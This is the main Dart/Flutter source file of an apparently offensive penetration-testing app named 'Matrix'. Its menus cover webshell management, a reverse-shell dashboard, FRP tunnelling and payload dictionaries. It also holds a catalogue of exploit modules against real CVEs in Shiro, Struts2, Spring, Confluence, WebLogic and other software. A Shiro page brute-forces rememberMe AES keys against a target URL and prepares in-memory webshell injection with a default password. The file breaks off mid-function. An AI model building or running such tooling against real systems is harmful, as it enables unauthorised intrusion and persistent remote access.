import 'dart:convert';
import 'dart:math';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart' show Clipboard, ClipboardData;

import 'database/database_helper.dart';
import 'database/database_init.dart';
import 'models/project.dart';
import 'exp/shiro/shiro_crypto.dart';
import 'exp/shiro/shiro_exp_service.dart';
import 'exp/shiro/shiro_mem_shell_service.dart';
import 'exp/shiro/shiro_payload_repo.dart';
import 'pages/project_management_page.dart';
import 'pages/project_scoped_page.dart';
import 'pages/webshell_management_page.dart';
import 'pages/reverse_shell_dashboard_page.dart';
import 'pages/frp_tunnel_page.dart';
import 'pages/payload_management_page.dart';
import 'pages/dictionary_management_page.dart';
import 'pages/info_collection_page.dart';
import 'pages/thinkphp_exp_page.dart';
import 'pages/zentao_exp_page.dart';
import 'pages/vulhub/struts2_exp_page.dart';
import 'pages/vulhub/spring_exp_page.dart';
import 'pages/vulhub/httpd_exp_page.dart';
import 'pages/vulhub/druid_exp_page.dart';
import 'pages/vulhub/ofbiz_exp_page.dart';
import 'pages/vulhub/solr_exp_page.dart';
import 'pages/vulhub/confluence_exp_page.dart';
import 'pages/vulhub/drupal_exp_page.dart';
import 'pages/vulhub/elasticsearch_exp_page.dart';
import 'pages/vulhub/flask_ssti_exp_page.dart';
import 'pages/vulhub/php_exp_page.dart';
import 'pages/vulhub/tomcat_exp_page.dart';
import 'pages/vulhub/weblogic_exp_page.dart';
import 'pages/vulhub/supervisor_exp_page.dart';
import 'pages/vulhub/xxljob_exp_page.dart';
import 'pages/vulhub/nacos_exp_page.dart';
import 'pages/vulhub/shellshock_exp_page.dart';
import 'pages/vulhub/saltstack_exp_page.dart';
import 'models/webshell.dart';
import 'pages/webshell_interactive_page.dart';
import 'services/scan_session_service.dart';
import 'services/seed_service.dart';
import 'theme/app_theme.dart';
import 'utils/matrix_console_log.dart';

/// 将 Flutter [debugPrint] 全部打到运行应用的终端，并带时间戳（不再依赖框架节流/仅 IDE 行为）。
void _installMatrixDebugPrint() {
  debugPrint = (String? message, {int? wrapWidth}) {
    if (message == null || message.isEmpty) return;
    final ts = matrixConsoleTimestamp();
    final prefix = '[Matrix][debug][$ts] ';
    if (wrapWidth == null) {
      // ignore: avoid_print
      print('$prefix$message');
      return;
    }
    for (final line in message.split('\n')) {
      if (line.length <= wrapWidth) {
        // ignore: avoid_print
        print('$prefix$line');
        continue;
      }
      var rest = line;
      while (rest.isNotEmpty) {
        final chunk = rest.length <= wrapWidth ? rest : rest.substring(0, wrapWidth);
        rest = rest.length <= wrapWidth ? '' : rest.substring(wrapWidth);
        // ignore: avoid_print
        print('$prefix$chunk');
      }
    }
  };
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  _installMatrixDebugPrint();
  initDatabase(); // 初始化 SQLite（桌面端使用 FFI）
  await ScanSessionService().resetStaleSessions(); // 清理上次异常退出遗留的 running 会话
  await SeedService.seed(DatabaseHelper()); // 首次启动种子化内置默认数据
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Matrix',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.dark(
          primary: AppColors.primary,
          surface: AppColors.bgDark,
          onSurface: AppColors.textPrimary,
        ),
        brightness: Brightness.dark,
        useMaterial3: true,
        textButtonTheme: TextButtonThemeData(
          style: TextButton.styleFrom(
            textStyle: const TextStyle(fontSize: 14, inherit: false),
          ),
        ),
        elevatedButtonTheme: ElevatedButtonThemeData(
          style: ElevatedButton.styleFrom(
            textStyle: const TextStyle(fontSize: 14, inherit: false),
          ),
        ),
        outlinedButtonTheme: OutlinedButtonThemeData(
          style: OutlinedButton.styleFrom(
            textStyle: const TextStyle(fontSize: 14, inherit: false),
          ),
        ),
      ),
      home: const MainLayout(),
    );
  }
}

/// 主布局：左侧菜单栏 + 右侧工作区
class MainLayout extends StatefulWidget {
  const MainLayout({super.key});

  @override
  State<MainLayout> createState() => _MainLayoutState();
}

class _MainLayoutState extends State<MainLayout> with TickerProviderStateMixin {
  int _selectedIndex = 0;
  Project? _selectedProject;
  bool _sidebarExpanded = true;
  bool _sidebarHidden = false;
  static const double _sidebarWidth = 220.0;
  static const double _sidebarCollapsedWidth = 72.0;

  late final AnimationController _blinkController;
  late final Animation<double> _blinkAnimation;

  final List<MenuItem> _menuItems = [
    MenuItem(icon: Icons.folder_outlined, label: '项目管理', selectedIcon: Icons.folder),
    MenuItem(icon: Icons.search_outlined, label: '信息收集', selectedIcon: Icons.search),
    MenuItem(icon: Icons.terminal_outlined, label: 'Webshell管理', selectedIcon: Icons.terminal),
    MenuItem(icon: Icons.bug_report_outlined, label: 'EXP管理', selectedIcon: Icons.bug_report),
    MenuItem(icon: Icons.code_outlined, label: 'Payload管理', selectedIcon: Icons.code),
    MenuItem(icon: Icons.menu_book_outlined, label: '字典管理', selectedIcon: Icons.menu_book),
    MenuItem(icon: Icons.computer_outlined, label: '完整终端', selectedIcon: Icons.computer),
    MenuItem(icon: Icons.alt_route_outlined, label: 'FRP隧道', selectedIcon: Icons.alt_route),
  ];

  @override
  void initState() {
    super.initState();
    _blinkController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 900),
    )..repeat(reverse: true);
    _blinkAnimation = CurvedAnimation(parent: _blinkController, curve: Curves.easeInOut);
  }

  @override
  void dispose() {
    _blinkController.dispose();
    super.dispose();
  }

  void _handleMenuTap(int index) {
    setState(() => _selectedIndex = index);
  }

  Widget _buildWorkspaceContent() {
    if (_selectedIndex == 0) {
      return ProjectManagementPage(
        selectedProject: _selectedProject,
        onEnterInfoCollection: (project) {
          setState(() {
            _selectedProject = project;
            _selectedIndex = 1;
          });
        },
        onEnterExp: (project) {
          setState(() {
            _selectedIndex = 3;
          });
        },
        onEnterWebshell: (project) {
          setState(() {
            _selectedProject = project;
            _selectedIndex = 2;
          });
        },
      );
    }
    if (_selectedIndex == 1) {
      return ProjectScopedPage(
        selectedProject: _selectedProject,
        onSelectProject: (p) => setState(() => _selectedProject = p),
        onClearProject: () => setState(() => _selectedProject = null),
        onNavigateToProjectManagement: () => setState(() {
          _selectedIndex = 0;
          _selectedProject = null;
        }),
        title: '信息收集',
        icon: Icons.search,
        contentBuilder: (project, onSwitchProject) =>
            InfoCollectionLandingPage(project: project, onSwitchProject: onSwitchProject),
      );
    }
    if (_selectedIndex == 2) {
      return ProjectScopedPage(
        selectedProject: _selectedProject,
        onSelectProject: (p) => setState(() => _selectedProject = p),
        onClearProject: () => setState(() => _selectedProject = null),
        onNavigateToProjectManagement: () => setState(() {
          _selectedIndex = 0;
          _selectedProject = null;
        }),
        title: 'Webshell管理',
        icon: Icons.terminal,
        contentBuilder: (project, onSwitchProject) =>
            WebshellManagementPage(project: project, onSwitchProject: onSwitchProject),
      );
    }
    if (_selectedIndex == 4) {
      return const PayloadManagementPage();
    }
    if (_selectedIndex == 3) {
      return const _ExpContent();
    }
    if (_selectedIndex == 5) {
      return const DictionaryManagementPage();
    }
    if (_selectedIndex == 6) {
      return const ReverseShellDashboardPage();
    }
    if (_selectedIndex == 7) {
      return const FrpTunnelPage();
    }
    return _WorkspaceContent(title: _menuItems[_selectedIndex].label);
  }

  @override
  Widget build(BuildContext context) {
    return LayoutBuilder(
      builder: (context, constraints) {
        final bool isMobile = constraints.maxWidth < 720;

        return Scaffold(
          body: Stack(
            children: [
              // 右侧工作区（底层）
              Positioned.fill(
                left: !isMobile && !_sidebarHidden
                    ? (_sidebarExpanded ? _sidebarWidth : _sidebarCollapsedWidth)
                    : 0,
                child: Container(
                  color: AppColors.bgDark,
                  child: Stack(
                    children: [
                      // 赛博网格背景
                      Positioned.fill(
                        child: CustomPaint(painter: _CyberGridPainter()),
                      ),
                      Positioned.fill(
                        child: Column(
                        crossAxisAlignment: CrossAxisAlignment.stretch,
                        children: [
                          // 顶部栏
                          Container(
                            height: 64,
                            padding: const EdgeInsets.symmetric(horizontal: 24),
                            decoration: BoxDecoration(
                              color: AppColors.bgElevated,
                              border: Border(
                                bottom: BorderSide(
                                  color: AppColors.primary.withValues(alpha: 0.5),
                                  width: 1,
                                ),
                              ),
                              boxShadow: [
                                BoxShadow(
                                  color: AppColors.primary.withValues(alpha: 0.06),
                                  blurRadius: 12,
                                  offset: const Offset(0, 2),
                                ),
                              ],
                            ),
                            child: Row(
                              children: [
                                // 闪烁状态点
                                AnimatedBuilder(
                                  animation: _blinkAnimation,
                                  builder: (_, __) => Container(
                                    width: 8,
                                    height: 8,
                                    margin: const EdgeInsets.only(right: 10),
                                    decoration: BoxDecoration(
                                      shape: BoxShape.circle,
                                      color: AppColors.primary.withValues(
                                        alpha: 0.5 + _blinkAnimation.value * 0.5,
                                      ),
                                      boxShadow: [
                                        BoxShadow(
                                          color: AppColors.primary.withValues(
                                            alpha: _blinkAnimation.value * 0.7,
                                          ),
                                          blurRadius: 8,
                                          spreadRadius: 1,
                                        ),
                                      ],
                                    ),
                                  ),
                                ),
                                Text(
                                  '>_ ',
                                  style: AppTextStyles.terminal(
                                    size: 14,
                                    color: AppColors.primary.withValues(alpha: 0.5),
                                  ),
                                ),
                                Text(
                                  _menuItems[_selectedIndex].label,
                                  style: AppTextStyles.heading(
                                    size: 18,
                                    color: AppColors.primary,
                                  ),
                                ),
                                const Spacer(),
                                IconButton(
                                  icon: const Icon(Icons.search),
                                  onPressed: () {},
                                  color: AppColors.textSecondary,
                                ),
                                IconButton(
                                  icon: const Icon(Icons.notifications_outlined),
                                  onPressed: () {},
                                  color: AppColors.textSecondary,
                                ),
                                const SizedBox(width: 8),
                                // 黑客风格用户头像
                                Container(
                                  width: 36,
                                  height: 36,
                                  decoration: BoxDecoration(
                                    shape: BoxShape.circle,
                                    border: Border.all(
                                      color: AppColors.primary.withValues(alpha: 0.6),
                                      width: 1.5,
                                    ),
                                    color: AppColors.primary.withValues(alpha: 0.1),
                                    boxShadow: [
                                      BoxShadow(
                                        color: AppColors.primary.withValues(alpha: 0.2),
                                        blurRadius: 8,
                                      ),
                                    ],
                                  ),
                                  child: Center(
                                    child: Text(
                                      'R',
                                      style: AppTextStyles.heading(
                                        size: 14,
                                        color: AppColors.primary,
                                      ),
                                    ),
                                  ),
                                ),
                              ],
                            ),
                          ),
                          // 工作区内容
                          Expanded(
                            child: Padding(
                              padding: const EdgeInsets.all(24),
                              child: _buildWorkspaceContent(),
                            ),
                          ),
                        ],
                      ),
                      ),
                    ],
                  ),
                ),
              ),

              // 手机端：菜单展开时的遮罩
              if (isMobile && !_sidebarHidden)
                Positioned.fill(
                  child: GestureDetector(
                    onTap: () => setState(() => _sidebarHidden = true),
                    child: Container(
                      color: Colors.black.withValues(alpha: 0.4),
                    ),
                  ),
                ),

              // 左侧菜单栏（上层，用位移动画实现侧滑）
              AnimatedPositioned(
                duration: const Duration(milliseconds: 200),
                curve: Curves.easeInOut,
                top: 0,
                bottom: 0,
                left: _sidebarHidden ? -_sidebarWidth : 0,
                width: _sidebarExpanded ? _sidebarWidth : _sidebarCollapsedWidth,
                child: _buildSidebar(),
              ),

              // 桌面端：隐藏后的展开按钮
              if (!isMobile && _sidebarHidden)
                Positioned(
                  left: 0,
                  top: 16,
                  child: SizedBox(
                    width: 40,
                    height: 40,
                    child: IconButton(
                      padding: EdgeInsets.zero,
                      iconSize: 20,
                      splashRadius: 20,
                      onPressed: () => setState(() => _sidebarHidden = false),
                      icon: const Icon(Icons.chevron_right, color: AppColors.textSecondary),
                      tooltip: '展开菜单',
                    ),
                  ),
                ),
            ],
          ),
        );
      },
    );
  }

  Widget _buildSidebar() {
    return LayoutBuilder(
      builder: (context, constraints) {
        final t = ((constraints.maxWidth - _sidebarCollapsedWidth) /
                (_sidebarWidth - _sidebarCollapsedWidth))
            .clamp(0.0, 1.0);
        return _buildSidebarContent(t);
      },
    );
  }

  Widget _buildSidebarContent(double t) {
    // Label elements fade in during the second half of expansion
    final labelOpacity = ((t - 0.3) / 0.5).clamp(0.0, 1.0);

    return Container(
      decoration: BoxDecoration(
        color: AppColors.bgDark,
        boxShadow: [
          BoxShadow(
            color: AppColors.primary.withValues(alpha: 0.08),
            blurRadius: 12,
            offset: const Offset(2, 0),
          ),
        ],
      ),
      child: Column(
        children: [
          // Logo area — icon always left-aligned, title + close fade in
          SizedBox(
            height: 64,
            child: Padding(
              padding: const EdgeInsets.symmetric(horizontal: 16),
              child: Row(
                children: [
                  Container(
                    width: 36,
                    height: 36,
                    decoration: BoxDecoration(
                      color: AppColors.primary.withValues(alpha: 0.2),
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(
                        color: AppColors.primary,
                        width: 1,
                      ),
                    ),
                    child: const Icon(
                      Icons.grid_view_rounded,
                      color: AppColors.primary,
                      size: 20,
                    ),
                  ),
                  Expanded(
                    child: Opacity(
                      opacity: labelOpacity,
                      child: Row(
                        children: [
                          const SizedBox(width: 12),
                          Expanded(
                            child: Text(
                              'Matrix',
                              style: AppTextStyles.title(
                                size: 20,
                                color: AppColors.textPrimary,
                              ),
                              overflow: TextOverflow.ellipsis,
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ),

          const Divider(height: 1, color: AppColors.border),

          // 菜单项
          Expanded(
            child: ListView.builder(
              padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 8),
              itemCount: _menuItems.length,
              itemBuilder: (context, index) {
                final item = _menuItems[index];
                final isSelected = _selectedIndex == index;
                return _SidebarMenuItem(
                  item: item,
                  isSelected: isSelected,
                  expandProgress: t,
                  onTap: () => _handleMenuTap(index),
                );
              },
            ),
          ),

          // 折叠按钮 — 箭头随动画旋转，文字渐显
          Padding(
            padding: const EdgeInsets.all(8.0),
            child: InkWell(
              onTap: () => setState(() => _sidebarExpanded = !_sidebarExpanded),
              borderRadius: BorderRadius.circular(8),
              child: Container(
                padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 12),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.start,
                  children: [
                    Transform.rotate(
                      angle: t * pi,
                      child: const Icon(
                        Icons.chevron_right,
                        color: AppColors.textSecondary,
                        size: 24,
                      ),
                    ),
                    Flexible(
                      child: Opacity(
                        opacity: labelOpacity,
                        child: Padding(
                          padding: const EdgeInsets.only(left: 12),
                          child: Text(
                            '收起',
                            style: AppTextStyles.caption(
                              size: 14,
                              color: AppColors.textSecondary,
                            ),
                          ),
                        ),
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

class _ExpEntry {
  final IconData icon;
  final String title;
  final String subtitle;
  final String tag;
  final Widget page;
  const _ExpEntry({required this.icon, required this.title, required this.subtitle, required this.tag, required this.page});
}

class _ExpContent extends StatelessWidget {
  const _ExpContent();

  static final List<_ExpEntry> _expEntries = [
    _ExpEntry(icon: Icons.cookie, title: 'Apache Shiro CVE-2016-4437', subtitle: 'rememberMe Key 爆破 / Payload 注入', tag: 'Java · 通用', page: ShiroExpPage()),
    _ExpEntry(icon: Icons.php, title: 'ThinkPHP CVE-2018-20062/CVE-2019-9082/CNVD-2022-86535', subtitle: '3.x/5.x/6.x 漏洞检测、RCE、GetShell', tag: 'PHP · 通用', page: ThinkphpExpPage()),
    _ExpEntry(icon: Icons.storage, title: 'Zentao CVE-2024-24216', subtitle: '绕过登录 · Repo 配置写入冰蝎 WebShell', tag: 'PHP · 禅道', page: ZentaoExpPage()),
    _ExpEntry(icon: Icons.bolt, title: 'Apache Struts2 S2-032/045/053/057/059', subtitle: 'OGNL 表达式注入 RCE 系列', tag: 'Java · Struts2', page: Struts2ExpPage()),
    _ExpEntry(icon: Icons.local_florist, title: 'Spring Framework CVE-2022-22963/22965/2018-1273/2017-8046', subtitle: 'Spring4Shell / Cloud Function / Data SpEL 注入系列', tag: 'Java · Spring', page: SpringExpPage()),
    _ExpEntry(icon: Icons.http, title: 'Apache HTTP Server CVE-2021-41773', subtitle: '路径规范化缺陷 — 路径穿越文件读取 + CGI RCE', tag: 'C · Apache', page: HttpdExpPage()),
    _ExpEntry(icon: Icons.data_object, title: 'Apache Druid CVE-2021-25646', subtitle: '嵌入式 JavaScript 代码注入 RCE (≤ 0.20.0)', tag: 'Java · Druid', page: DruidExpPage()),
    _ExpEntry(icon: Icons.business, title: 'Apache OFBiz CVE-2023-51467 / CVE-2024-38856', subtitle: 'Groovy 代码注入无需认证 RCE', tag: 'Java · OFBiz', page: OFBizExpPage()),
    _ExpEntry(icon: Icons.search, title: 'Apache Solr CVE-2017-12629', subtitle: 'RunExecutableListener 任意命令执行 (< 7.1.0)', tag: 'Java · Solr', page: SolrExpPage()),
    _ExpEntry(icon: Icons.article, title: 'Confluence CVE-2023-22527', subtitle: 'OGNL 模板注入无需认证 RCE (8.0–8.5.3)', tag: 'Java · Confluence', page: ConfluenceExpPage()),
    _ExpEntry(icon: Icons.water_drop, title: 'Drupal CVE-2018-7600 (Drupalgeddon2)', subtitle: 'Form API #post_render 回调 PHP 代码执行', tag: 'PHP · Drupal', page: DrupalExpPage()),
    _ExpEntry(icon: Icons.manage_search, title: 'Elasticsearch CVE-2015-1427', subtitle: 'Groovy 脚本沙箱逃逸 RCE (< 1.3.8 / < 1.4.3)', tag: 'Java · ES', page: ElasticsearchExpPage()),
    _ExpEntry(icon: Icons.code, title: 'Flask / Jinja2 SSTI', subtitle: '服务端模板注入执行任意 Python 代码', tag: 'Python · Flask', page: FlaskSstiExpPage()),
    _ExpEntry(icon: Icons.php, title: 'PHP 8.1.0-dev 后门 / CVE-2012-1823 PHP-CGI', subtitle: 'User-Agentt 后门 + CGI 参数注入 RCE', tag: 'PHP · 通用', page: PhpExpPage()),
    _ExpEntry(icon: Icons.cloud_upload, title: 'Apache Tomcat CVE-2017-12615', subtitle: 'PUT 方法开启时上传 JSP Webshell RCE', tag: 'Java · Tomcat', page: TomcatExpPage()),
    _ExpEntry(icon: Icons.dns, title: 'Oracle WebLogic CVE-2017-10271 / CVE-2020-14882', subtitle: 'XMLDecoder 反序列化 + 控制台未授权 RCE', tag: 'Java · WebLogic', page: WebLogicExpPage()),
    _ExpEntry(icon: Icons.settings_applications, title: 'Supervisor CVE-2017-11610', subtitle: 'XML-RPC 未授权方法调用链 RCE (3.3.2)', tag: 'Python · Supervisor', page: SupervisorExpPage()),
    _ExpEntry(icon: Icons.schedule, title: 'XXL-JOB 未授权访问执行器 RCE', subtitle: 'GLUE_SHELL 类型提交任意 Shell 命令 (2.2.0)', tag: 'Java · XXL-JOB', page: XxlJobExpPage()),
    _ExpEntry(icon: Icons.cloud, title: 'Nacos CVE-2021-29441', subtitle: 'User-Agent 认证绕过，枚举/创建用户 (< 1.4.1)', tag: 'Java · Nacos', page: NacosExpPage()),
    _ExpEntry(icon: Icons.terminal, title: 'Bash Shellshock CVE-2014-6271', subtitle: '环境变量函数定义解析注入 CGI RCE', tag: 'Shell · Bash', page: ShellshockExpPage()),
    _ExpEntry(icon: Icons.grain, title: 'SaltStack CVE-2020-16846', subtitle: 'SSH 模块 ssh_priv 参数命令注入 RCE', tag: 'Python · SaltStack', page: SaltstackExpPage()),
  ];

  @override
  Widget build(BuildContext context) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            color: AppColors.bgCard,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: AppColors.primary.withValues(alpha: 0.5)),
          ),
          child: Row(
            children: [
              const Icon(Icons.bug_report, color: AppColors.primary, size: 32),
              const SizedBox(width: 16),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      'EXP 管理',
                      style: AppTextStyles.heading(size: 18, color: AppColors.primary),
                    ),
                    Text(
                      '在这里集中管理各类漏洞利用模块，点击条目进入对应利用界面',
                      style: AppTextStyles.caption(size: 14, color: AppColors.cyan),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
        const SizedBox(height: 24),
        Expanded(
          child: ListView.separated(
            padding: const EdgeInsets.only(bottom: 16),
            itemCount: _expEntries.length,
            separatorBuilder: (_, __) => const SizedBox(height: 12),
            itemBuilder: (context, index) {
              final e = _expEntries[index];
              return _ExpEntryCard(
                icon: e.icon,
                title: e.title,
                subtitle: e.subtitle,
                tag: e.tag,
                onTap: () => Navigator.of(context).push(
                  MaterialPageRoute(builder: (_) => e.page),
                ),
              );
            },
          ),
        ),
      ],
    );
  }
}

class ShiroExpPage extends StatelessWidget {
  const ShiroExpPage({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppColors.bgDark,
      appBar: AppBar(
        backgroundColor: AppColors.bgElevated,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back),
          onPressed: () => Navigator.of(context).pop(),
        ),
        title: Row(
          children: [
            const Icon(Icons.cookie, color: AppColors.primary),
            const SizedBox(width: 8),
            Text(
              'Apache Shiro 反序列化利用',
              style: AppTextStyles.heading(size: 14, color: AppColors.primary),
            ),
          ],
        ),
      ),
      body: Padding(
        padding: const EdgeInsets.all(24),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
              decoration: BoxDecoration(
                color: AppColors.bgCard,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: AppColors.border),
                boxShadow: [
                  BoxShadow(
                    color: AppColors.primary.withValues(alpha: 0.06),
                    blurRadius: 12,
                    offset: const Offset(0, 2),
                  ),
                ],
              ),
              child: Row(
                children: [
                  Container(
                    width: 44,
                    height: 44,
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                        colors: [
                          AppColors.primary.withValues(alpha: 0.2),
                          AppColors.primary.withValues(alpha: 0.08),
                        ],
                      ),
                      borderRadius: BorderRadius.circular(10),
                      border: Border.all(
                        color: AppColors.primary.withValues(alpha: 0.4),
                        width: 1,
                      ),
                    ),
                    child: const Icon(Icons.security, color: AppColors.primary, size: 22),
                  ),
                  const SizedBox(width: 16),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          'rememberMe Key 爆破与利用',
                          style: AppTextStyles.heading(
                            size: 14,
                            color: AppColors.textPrimary,
                          ),
                        ),
                        const SizedBox(height: 4),
                        Text(
                          '支持 AES-CBC / AES-GCM，字典爆破 Key 后加载自定义 Payload',
                          style: AppTextStyles.caption(
                            size: 12,
                            color: AppColors.textSecondary,
                          ),
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
            const SizedBox(height: 16),
            const Expanded(child: _ShiroExpCard()),
          ],
        ),
      ),
    );
  }
}

class _ExpEntryCard extends StatelessWidget {
  final IconData icon;
  final String title;
  final String subtitle;
  final String tag;
  final VoidCallback? onTap;

  const _ExpEntryCard({
    required this.icon,
    required this.title,
    required this.subtitle,
    required this.tag,
    required this.onTap,
  });

  @override
  Widget build(BuildContext context) {
    final enabled = onTap != null;
    return Material(
      color: Colors.transparent,
      child: InkWell(
        onTap: onTap,
        borderRadius: BorderRadius.circular(12),
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
          decoration: BoxDecoration(
            color: enabled ? AppColors.bgCard : AppColors.bgCard.withValues(alpha: 0.7),
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: AppColors.border),
          ),
          child: Row(
            children: [
              Container(
                width: 48,
                height: 48,
                decoration: BoxDecoration(
                  color: AppColors.primary.withValues(alpha: 0.15),
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(color: AppColors.primary.withValues(alpha: 0.5)),
                ),
                child: Icon(icon, color: AppColors.primary, size: 24),
              ),
              const SizedBox(width: 16),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Text(
                      title,
                      maxLines: 1,
                      overflow: TextOverflow.ellipsis,
                      style: AppTextStyles.heading(
                        size: 15,
                        color: AppColors.textPrimary,
                      ),
                    ),
                    const SizedBox(height: 4),
                    Text(
                      subtitle,
                      maxLines: 1,
                      overflow: TextOverflow.ellipsis,
                      style: AppTextStyles.caption(
                        size: 13,
                        color: AppColors.textSecondary,
                      ),
                    ),
                  ],
                ),
              ),
              const SizedBox(width: 12),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                decoration: BoxDecoration(
                  color: AppColors.bgElevated,
                  borderRadius: BorderRadius.circular(6),
                  border: Border.all(color: AppColors.border),
                ),
                child: Text(
                  tag,
                  style: AppTextStyles.caption(
                    size: 12,
                    color: AppColors.textSecondary,
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

class _ShiroExpCard extends StatefulWidget {
  const _ShiroExpCard();

  @override
  State<_ShiroExpCard> createState() => _ShiroExpCardState();
}

class _ShiroExpCardState extends State<_ShiroExpCard> {
  final _urlController = TextEditingController();
  final _cookieNameController = TextEditingController();
  final _timeoutController = TextEditingController();
  final _keyController = TextEditingController();
  final _payloadB64Controller = TextEditingController();
  final _logScrollController = ScrollController();

  // 内存马注入相关
  MemShellType _memShellType = MemShellType.filter;
  final _memShellPasswordController =
      TextEditingController(text: 'mAtrix_911');
  final _memShellPathController =
      TextEditingController(text: '/favicondemo.ico');
  final _memShellService = const ShiroMemShellService();

  String _method = 'GET';

  String? get _currentKey => _keyController.text.trim().isNotEmpty
      ? _keyController.text.trim()
      : null;

  @override
  void dispose() {
    _urlController.dispose();
    _cookieNameController.dispose();
    _timeoutController.dispose();
    _keyController.dispose();
    _payloadB64Controller.dispose();
    _logScrollController.dispose();
    _memShellPasswordController.dispose();
    _memShellPathController.dispose();
    super.dispose();
  }

  ShiroEncryptionMode _encryptionMode = ShiroEncryptionMode.cbc;
  String _log = '';
  bool _running = false;
  bool _verboseMode = false;
  final _payloadRepo = const ShiroPayloadRepo();

  void _appendLog(String line) {
    setState(() {
      final existing = _log.isEmpty ? <String>[] : _log.split('\n');
      existing.add(line);
      const maxLines = 500;
      final trimmed =
          existing.length > maxLines ? existing.sublist(existing.length - maxLines) : existing;
      _log = trimmed.join('\n');
    });
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (_logScrollController.hasClients) {
        _logScrollController.animateTo(
          _logScrollController.position.maxScrollExtent,
          duration: const Duration(milliseconds: 100),
          curve: Curves.easeOut,
        );
      }
    });
  }

  Future<void> _handleCheckShiro() async {
    final url = _urlController.text.trim();
    if (url.isEmpty) {
      _appendLog('[!] 请输入目标 URL');
      return;
    }
    setState(() => _running = true);
    _appendLog('[*] 检测 Shiro: $url');
    try {
      final timeout = int.tryParse(_timeoutController.text.trim()) ?? 10;
      final svc = ShiroExpService(
        url: url,
        method: _method,
        cookieName: _cookieNameController.text.trim().isNotEmpty
            ? _cookieNameController.text.trim()
            : 'rememberMe',
        timeout: Duration(seconds: timeout),
      );
      final ok = await svc.checkIsShiro();
      _appendLog(ok ? '[+] 发现 Shiro 框架' : '[-] 未检测到 Shiro');
    } catch (e) {
      _appendLog('[!] 检测异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  Future<void> _handleBruteforce() async {
    final url = _urlController.text.trim();
    if (url.isEmpty) {
      _appendLog('[!] 请输入目标 URL');
      return;
    }
    // 检测 / 爆破 Key 始终使用内置 principal payload
    const payloadFile = 'shiro_payload_principal.b64';
    setState(() => _running = true);
    _appendLog('[*] 从 data/$payloadFile 加载序列化 payload（为空则使用默认 principal）...');
    try {
      final payload = await _payloadRepo.loadPayload(payloadFile);
      if (payload.isEmpty) {
        _appendLog('[-] 未能读取 payload 文件或内容为空');
        return;
      }
      final keys = await _payloadRepo.loadKeys();
      if (keys.isEmpty) {
        _appendLog('[-] data/shiro_keys.txt 为空或未找到');
        return;
      }
      final timeout = int.tryParse(_timeoutController.text.trim()) ?? 10;
      final svc = ShiroExpService(
        url: url,
        method: _method,
        cookieName: _cookieNameController.text.trim().isNotEmpty
            ? _cookieNameController.text.trim()
            : 'rememberMe',
        timeout: Duration(seconds: timeout),
      );
      _appendLog('[*] 开始爆破 key，候选数：${keys.length}');
      String? found;
      found = await svc.bruteForceKey(
        candidateKeysBase64: keys,
        serializedPayload: payload,
        mode: _encryptionMode,
        onProgress: _appendLog,
        verbose: _verboseMode,
      );
      if (found != null) {
        setState(() {
          _keyController.text = found!;
        });
        _appendLog('[+] 爆破成功，已选中当前 Key：$found');
      } else {
        _appendLog('[!] 未找到可用 key');
      }
    } catch (e) {
      _appendLog('[!] 爆破异常: $e');
    } finally {
      if (mounted) setState(() => _running = false);
    }
  }

  Future<void> _handleVerifyKey() async {
    final url = _urlController.text.trim();
    if (url.isEmpty) {
      _appendLog('[!] 请输入目标 URL');
      return;
    }
    final key = _currentKey;
    if (key == null) {
      _appendLog('[!] 请先爆破出 Key 或输入 Key');
      return;
    }
    setState(() => _running = true);
    _appendLog('[*] 验证 Key: $key');
    try {
      const payloadFile = 'shiro_payload_principal.b64';
      final payload = await _payloadRepo.loadPayload(payloadFile);
      if (payload.isEmpty) {
        _appendLog('[-] 未能加载 principal payload');
        return;
      }
      final timeout = int.tryParse(_timeoutController.text.trim()) ?? 10;
      final svc = ShiroExpService(
        url: url,
        method: _method,
        cookieName: _cookieNameController.text.trim().isNotEmpty
            ? _cookieNameController.text.trim()
            : 'rememberMe',
        timeout: Duration(seconds: timeout),
      );
      final ok = await svc.verifyKey(
        keyBase64: key,
        serializedPayload: payload,
        mode: _encryptionMode,
        onProgress: _appendLog,
      );
      _appendLog(ok ? '[+] Key 验证通过' : '[-] Key 验证失败');
    } catch (e) {
      _appendLog('[!] 验证异常: $e');
    } finally {
